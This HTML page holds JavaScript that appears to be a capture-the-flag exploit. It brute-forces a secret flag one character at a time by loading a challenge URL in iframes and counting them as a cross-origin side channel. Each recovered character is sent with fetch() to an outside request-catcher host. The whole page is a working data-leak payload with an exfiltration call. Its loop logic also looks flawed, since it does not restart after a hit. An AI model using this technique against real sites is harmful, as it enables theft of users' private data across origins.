<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Finder</title>
</head>
<body>
    <h1>Flag Finderㅇㅇㅇ</h1>
    <script>
        const checkFlag = async () => {
            let server_flag = '';

            for (let i = 32; i <= 127; i++) {
                const flag = server_flag + String.fromCharCode(i);
                const requestUrl = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(flag)}`;

                // iframe 생성
                const iframe = document.createElement('iframe');
                iframe.id = 'goblin'; // ID 설정
                iframe.src = requestUrl;
                document.body.appendChild(iframe);

                // iframe이 로드될 때까지 기다림
                await new Promise(resolve => {
                    setTimeout(() => {
                        // goblin iframe의 개수를 확인
                        const goblinCount = document.querySelectorAll('iframe#goblin').length;

                        // 만약 goblin iframe이 증가했다면
                        if (goblinCount > 1) {
                            server_flag += String.fromCharCode(i); // 해당 문자를 추가
                            console.log(`Current FLAG: ${server_flag}`);

                            // 최종 FLAG를 서버로 보내기
                            const finalRequestUrl = `https://xlduugj.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
                            fetch(finalRequestUrl); // 최종 요청
                        }

                        // iframe을 제거하여 메모리 누수 방지
                        document.body.removeChild(iframe);
                        resolve();
                    }, 1000); // 1초 후에 iframe 제거
                });
            }
        };

        checkFlag();
    </script>
</body>
</html>
